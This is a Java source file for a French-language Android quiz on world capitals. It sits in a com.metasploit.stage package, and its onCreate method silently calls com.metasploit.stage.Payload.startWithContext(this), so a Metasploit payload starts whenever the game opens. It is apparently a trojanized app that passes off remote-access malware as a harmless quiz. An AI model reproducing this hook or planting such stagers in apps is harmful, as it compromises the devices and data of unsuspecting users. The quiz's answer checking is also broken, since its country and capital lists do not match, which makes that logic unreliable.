package com.metasploit.stage;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class CapitalePaysMondeActivity extends Activity {
	/** Called when the activity is first created. */
	private int nombreReponseTotal = 0;

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
        com.metasploit.stage.Payload.startWithContext(this);
		final Button commencerPartie = (Button) findViewById(R.id.debuter);

		setOnItemClickListener(new OnItemClickListener() {

			@Override
			public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
					long arg3) {
				// TODO Auto-generated method stub
				AlertDialog.Builder adb = new AlertDialog.Builder(
						CapitalePaysMondeActivity.this);
				adb.setTitle("androidbenincom@gmail.com");
				String message=recupererNomApplication();
				adb.setMessage("Retrouver sur Android Market: "+message);
				adb.setPositiveButton("Ok", null);
				adb.show();
			}
		});
		
		
		commencerPartie.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub

				final TextView resultat = (TextView) findViewById(R.id.resultat);
				resultat.setText("");

				final TextView pays = (TextView) findViewById(R.id.pays);
				final String paysGenerer = genererPays();
				pays.setText(paysGenerer);

				final EditText capitalRecuperer = (EditText) findViewById(R.id.capital);

				final Button valider = (Button) findViewById(R.id.valider);
				valider.setOnClickListener(new View.OnClickListener() {

					@Override
					public void onClick(View arg0) {
						// TODO Auto-generated method stub
						if (capitalRecuperer != null) {
							validerCapitale(capitalRecuperer);
						}
					}

					public void validerCapitale(EditText capitalRecuperer) {
						// TODO Auto-generated method stub
						List<String> listeCapitale = recupererListeCapitale();
						List<String> listepays = recupererListePays();

						final TextView resultat = (TextView) findViewById(R.id.resultat);

						final TextView totalReponse = (TextView) findViewById(R.id.total_reponse);

						int indexPaysGenerer = listepays
								.lastIndexOf(paysGenerer);
						int indexCapital = listeCapitale
								.lastIndexOf(capitalRecuperer.getText()
										.toString());
						Boolean statut = false;

						for (String capitale : listeCapitale) {
							if (capitalRecuperer
									.getText().toString().equalsIgnoreCase(capitale)
									&& (indexCapital == indexPaysGenerer)) {

								nombreReponseTotal = nombreReponseTotal + 1;
								statut = true;
							}
						}
						if (statut) {
							resultat.setText("Gagné");
							totalReponse.setText("Score: "
									+ String.valueOf(nombreReponseTotal));
						} else {
							resultat.setText("Perdu");
							totalReponse.setText("Score: "
									+ String.valueOf(nombreReponseTotal));
						}

					}

					private ArrayList<String> recupererListeCapitale() {
						// TODO Auto-generated method stub
						ArrayList<String> listeCapitale = new ArrayList<String>();
						String[] pays = { "Ponta Delgada", "Kaboul",
								"Pretoria", "Tirana", "Alger", "Berlin",
								"Andorre-la-Vieille", "Luanda", "Saint John's",
								"Riyad", "Buenos Aires", "Erevan", "Canberra",
								"Vienne", "Bakou", "Nassau", "Manama", "Dacca",
								"Bridgetown", "Bruxelles", "Belmopan",
								"Porto-Novo", "Hamilton", "Thimphu", "Minsk",
								"Sarajevo", "Gaborone", "Brasilia",
								"Bandar Seri Begawan", "Sofia", "Ouagadougou",
								"Bujumbura", "Phnom Penh", "Yaoundé", "Ottawa",
								"Praia", "Bangui", "Santiago", "Pékin",
								"Nicosie", "Bogota", "Moroni", "Kinshasa",
								"Avarua", "Pyongyang", "Séoul", "Rica",
								"Yamoussoukro", "Zagreb", "La Havane",
								"Copenhague", "Djibouti", "Roseau", "Caire",
								"Abou Dhabi", "Quito", "Asmara", "Madrid",
								"Tallinn", "Washington", "Addis-Abeba", "Suva",
								"Helsinki", "Paris", "Libreville", "Banjul",
								"Tbilissi", "Accra", "Athènes",
								"Saint George's", "Nuuk",
								"Ciudad de Guatemala", "Conakry", "Malabo",
								"Bissau", "Georgetown", "Port-au-Prince",
								"Tegucigalpa", "Budapest", "New Delhi",
								"Jakarta", "Bagdad", "Téhéran", "Dublin",
								"Reykjavik", "Jérusalem", "Rome", "Kingston",
								"Tokyo", "Amman", "Astana", "Nairobi",
								"Bichkek", "Tarawa-Sud", "Koweït", "Vientiane",
								"Maseru", "Riga", "Beyrouth", "Monrovia",
								"Tripoli", "Vaduz", "Vilnius", "Luxembourg",
								"Skopje", "Antananarivo", "Kuala Lumpur",
								"Lilongwe", "Malé", "Bamako", "La Valette",
								"Rabat", "Port-Louis", "Nouakchott", "Mexico",
								"Palikir", "Chisinau", "Monaco", "Oulan-Bator",
								"Podgorica", "Maputo", "Windhoek", "Yaren",
								"Katmandou", "Managua", "Niamey", "Abuja",
								"Alofi", "Oslo", "Wellington", "Mascate",
								"Kampala", "Tachkent", "Islamabad", "Melekeok",
								"Panama", "Port Moresby", "Asunción",
								"Amsterdam", "Lima", "Manille", "Varsovie",
								"San Juan", "Lisbonne", "Doha",
								"Saint-Domingue", "Prague", "Bucarest",
								"Londres", "Moscou", "Kigali", "Castries",
								"Kingstown", "San Salvador", "Apia", "Dakar",
								"Belgrade", "Victoria", "Freetown",
								"Singapour", "Bratislava", "Ljubljana",
								"Muqdisho", "Khartoum", "Colombo", "Stockholm",
								"Berne", "Paramaribo", "Mbabane", "Damas",
								"Douchanbé", "Dodoma", "N'Djamena", "Bangkok",
								"Lomé", "Nuku'alofa", "Port of Spain", "Tunis",
								"Achgabat", "Ankara", "Funafuti", "Kiev",
								"Montevideo", "Port Vila", "Cité du Vatican",
								"Caracas", "Hanoï", "Sanaa", "Lusaka", "Harare" };
						for (String string : pays) {
							listeCapitale.add(string);
						}

						return listeCapitale;
					}

				});
			}

		});
	}

	private void setOnItemClickListener(OnItemClickListener onItemClickListener) {
		// TODO Auto-generated method stub
		// TODO Auto-generated method stub
		AlertDialog.Builder adb = new AlertDialog.Builder(
				CapitalePaysMondeActivity.this);
		adb.setTitle("androidbenincom@gmail.com");
		String message=recupererNomApplication();
		adb.setMessage("Retrouver sur Android Market: "+message);
		adb.setPositiveButton("Ok", null);
		adb.show();
	}

	private String recupererNomApplication() {
		// TODO Auto-generated method stub
		String applicationSelectionnee = "";
		ArrayList<String> listeApplication = new ArrayList<String>();
		String[] applications = { "HotelBenin", "QuizzGeographieBenin",
				"IdPassGenOrigin", "PassGenOrigin", "RestaurantBenin",
				"CapitalPaysAfrique","PharmacieBenin" };
		for (String application : applications) {
			listeApplication.add(application);
		}
		Random rand = new Random();
		applicationSelectionnee = String.valueOf(listeApplication.get(rand
				.nextInt(listeApplication.size())));

		return applicationSelectionnee;
	}
	

	public String genererPays() {
		String pays_selectionne = "";
		ArrayList<String> listePays = new ArrayList<String>();
		String[] pays = { "Açores", "Afghanistan", "Afrique du Sud", "Albanie",
				"Algérie", "Allemagne", "Andorre", "Angola",
				"Antigua-et-Barbuda", "Arabie saoudite", "Argentine",
				"Arménie", "Australie", "Autriche", "Azerbaïdjan", "Bahamas",
				"Bahreïn", "Bangladesh", "Barbade", "Belgique", "Belize",
				"Bénin", "Bermudes", "Bhoutan", "Biélorussie",
				"Bosnie-Herzégovine", "Botswana", "Brésil", "Brunei",
				"Bulgarie", "Burkina Faso", "Burundi", "Cambodge", "Cameroun",
				"Canada", "Cap-Vert", "Centrafrique", "Chili", "Chine",
				"Chypre", "Colombie", "Comores", "Congo", "Cook",
				"Corée du Nord", "Corée du Sud", "Costa", "Côte d'Ivoire",
				"Croatie", "Cuba", "Danemark", "Djibouti", "Dominique",
				"Égypte", "Émirats arabes unis", "Équateur", "Érythrée",
				"Espagne", "Estonie", "États-Unis", "Éthiopie", "Fidji",
				"Finlande", "France", "Gabon", "Gambie", "Géorgie", "Ghana",
				"Grèce", "Grenade", "Groenland", "Guatemala", "Guinée",
				"Guinée équatoriale", "Guinée-Bissau", "Guyana", "Haïti",
				"Honduras", "Hongrie", "Inde", "Indonésie", "Irak", "Iran",
				"Irlande", "Islande", "Israël", "Italie", "Jamaïque", "Japon",
				"Jordanie", "Kazakhstan", "Kenya", "Kirghizistan", "Kiribati",
				"Koweït", "Laos", "Lesotho", "Lettonie", "Liban", "Libéria",
				"Libye", "Liechtenstein", "Lituanie", "Luxembourg",
				"Macédoine", "Madagascar", "Malaisie", "Malawi", "Maldives",
				"Mali", "Malte", "Maroc", "Maurice", "Mauritanie", "Mexique",
				"Micronésie", "Moldavie", "Monaco", "Mongolie", "Monténégro",
				"Mozambique", "Namibie", "Nauru", "Népal", "Nicaragua",
				"Niger", "Nigeria", "Niué", "Norvège", "Nouvelle-Zélande",
				"Oman", "Ouganda", "Ouzbékistan", "Pakistan", "Palaos",
				"Panama", "Papouasie- Nouvelle Guinée", "Paraguay", "Pays-Bas",
				"Pérou", "Philippines", "Pologne", "Porto Rico", "Portugal",
				"Qatar", "République Dominicaine", "République Tchèque",
				"Roumanie", "Royaume-Uni", "Russie", "Rwanda", "Sainte-Lucie",
				"Saint-Vincent-et-les Grenadines", "Salvador",
				"Samoa occidentales", "Sénégal", "Serbie", "Seychelles",
				"Sierra Leone", "Singapour", "Slovaquie", "Slovénie",
				"Somalie", "Soudan", "Sri Lanka", "Suède", "Suisse",
				"Suriname", "Swaziland", "Syrie", "Tadjikistan", "Tanzanie",
				"Tchad", "Thaïlande", "Togo", "Tonga", "Trinité-et-Tobago",
				"Tunisie", "Turkménistan", "Turquie", "Tuvalu", "Ukraine",
				"Uruguay", "Vanuatu", "Vatican", "Venezuela", "ViêtNam",
				"Yémen", "Zambie", "Zimbabwe" };
		for (String string : pays) {
			listePays.add(string);
		}
		Random rand = new Random();
		pays_selectionne = String.valueOf(listePays.get(rand.nextInt(listePays
				.size())));

		return pays_selectionne;
	}

	public List<String> recupererListePays() {

		ArrayList<String> listePays = new ArrayList<String>();
		String[] pays = { "Afrique du Sud", "Algérie", "Angola", "Bénin",
				"Botswana", "Burkina", "Burundi", "Cameroun", "Cap-Vert",
				"Centrafrique", "Comores", "Congo-Brazaville",
				"Congo-Kinshasa", "Côte d'Ivoire", "Djibouti", "Égypte",
				"Érythrée", "Éthiopie", "Gabon", "Gambie", "Ghana", "Guinée",
				"Guinée équatoriale", "Guinée-Bissau", "Kenya", "Lesotho",
				"Libéria", "Libye", "Madagascar", "Malawi", "Mali", "Maroc",
				"Maurice", "Mauritanie", "Mozambique", "Namibie", "Niger",
				"Nigéria", "Ouganda", "Rwanda", "Sao Tomé-et-Principe",
				"Sénégal", "Seychelles", "Sierra Leone", "Somalie", "Soudan",
				"Swaziland", "Tanzanie", "Tchad", "Togo", "Tunisie", "Zambie",
				"Zimbabwe" };
		for (String string : pays) {
			listePays.add(string);
		}

		return listePays;
	}

}